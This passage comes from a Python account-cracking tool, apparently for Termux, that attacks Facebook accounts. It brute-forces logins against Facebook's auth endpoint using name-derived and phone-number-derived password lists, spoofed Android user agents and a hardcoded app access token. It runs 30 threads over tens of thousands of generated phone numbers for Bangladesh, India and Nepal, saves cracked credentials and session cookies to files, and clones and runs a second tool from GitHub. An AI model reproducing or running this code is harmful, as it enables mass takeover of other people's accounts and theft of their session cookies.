            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            fbCa = "arm64-v8a:armeabi-v7a:armeabi","arm64-v8a:null","armeabi-v7a:armeabi","x86:armeabi-v7a"
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(6,14))+"; SM-G930VL Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629364;FBDM/"+"{density=4.0,width=1440,height=2560};"+"FBLC/en_US;FBRV/210796532;FBCR/Home;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930VL;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            uaD3 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; SM-N975U Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/"+"{density=3.5,width=1440,height=2759};"+"FBLC/en_US;FBRV/228899333;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            uaD4 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(6,14))+"; CPH1719 Build/SP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128646;FBDM/"+"{density=3.0,width=1080,height=2016};"+"FBLC/zh_TW;FBRV/0;FBCR/Chunghwa;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1719;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            uaD5 = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(6,14))+"; moto z3 Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/"+"{density=3.0,width=1080,height=2016};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z3;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
            uaD6 = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(6,14))+"; Redmi Note 7/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/354.0.0.22.110;FBBV/350972604;FBDM/"+"{density=2.75,width=1080,height=2131};"+f"FBLC/ru_RU;FBRV/352533088;FBCR/Beeline UZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            hix = random.choice([uaD1,uaD2,uaD3,uaD4,uaD5,uaD6])
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":uaD2,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://b-graph.facebook.com/auth/login"
            sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in sxr_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')                
                oks.append(ids)
                uid=str(ids)
                Elite(uid,pww,coki)
                break
            elif 'www.facebook.com' in sxr_respns['error']['message']:
                #print(f"\r\r {c}[SMILE-CP] {ids} | {pww}")
                open('/sdcard/SMILE-FILE-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
    
#▬▭▬▭▬▭▬▭[ FILE MATHID - 5 ]▬▭▬▭▬▭▬▭#
def sxr_f_m5(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[{b} SMILE-M5{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            fbCa = "arm64-v8a:armeabi-v7a:armeabi","arm64-v8a:null","armeabi-v7a:armeabi","x86:armeabi-v7a"
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; 2015816 Build/TD2A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/317.0.0.49.121;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/462786878;FBCR/No service;FBMF/Xiaomi;FBBD/redmi;FBDV/2015816;FBSV/9.5.4;FBCA/arm64-v8a:null;FBDM/{density=2.25,width=720,height=1184};]"
            uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295906941;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBRV/297807842;FBCR/Claro AR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            uaD3 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400854;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/305464431;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
            uaD4 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            uaD5 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281684;FBDM/{density=3.5,width=1440,height=2907};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            uaD6 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621626;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/302782848;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
            uaD7 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/302401544;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            hix = random.choice([uaD1,uaD2,uaD3,uaD4,uaD5,uaD6,uaD7])
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":ooo(),"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://graph.facebook.com/auth/login"
            sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in sxr_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')                
                oks.append(ids)
                uid=str(ids)
                Elite(uid,pww,coki)
                break
            elif 'www.facebook.com' in sxr_respns['error']['message']:
                #print(f"\r\r {c}[SMILE-CP] {ids} | {pww}")
                open('/sdcard/SMILE-FILE-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ SMILE RANDOM ]▬▭▬▭▬▭▬▭#
def smile_random():
	os.system("rm -rf MR-SMILE")
	os.system("cd && git clone https://github.com/destroyedking/ATOM")
	os.system('cd && cd ATOM ;python ATOM.py')
#▬▭▬▭▬▭▬▭[ SMILE RANDOM BD ]▬▭▬▭▬▭▬▭#
def bd():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}0171 {a}- {f}0181 {a}- {f}0198 {a}- {f}0161{f}\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4\n {sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:sxr_mthd.append("C")
    elif mthd_inn in ['d','D','4','04']:sxr_mthd.append("D")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],hugu[2:8],hugu[1:8],ids,hugu,'Bangladesh','bangladesh']
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
            elif 'D' in sxr_mthd:sifaxxx.submit(rndm4,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SMILE-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SMILE RANDOM INDIA ]▬▭▬▭▬▭▬▭#
def ind():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}6390 {a}- {f}6354{a}- {f}9340 {a}- {f}9749\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4 {sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:sxr_mthd.append("C")
    elif mthd_inn in ['d','D','4','04']:sxr_mthd.append("D")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],hugu[2:8],hugu[1:8],ids,hugu]
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
            elif 'D' in sxr_mthd:sifaxxx.submit(rndm4,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SMILE-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SMILE RANDOM NEPAL ]▬▭▬▭▬▭▬▭#
def npl():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}9815 {a}- {f}9814 {a}- {f}9861 {a}- {f}9840\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
